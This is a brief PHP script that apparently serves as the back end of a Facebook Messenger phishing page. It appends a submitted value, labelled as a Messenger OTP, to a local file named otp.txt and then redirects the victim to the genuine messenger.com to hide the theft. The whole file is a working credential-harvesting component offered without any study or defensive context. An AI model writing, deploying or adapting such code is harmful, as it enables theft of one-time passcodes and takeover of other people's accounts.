<?php
file_put_contents("otp.txt", "Facebook Messenger OTP : " . $email = $_POST['email'] . "\n", FILE_APPEND);
header('Location: https://messenger.com');
?>
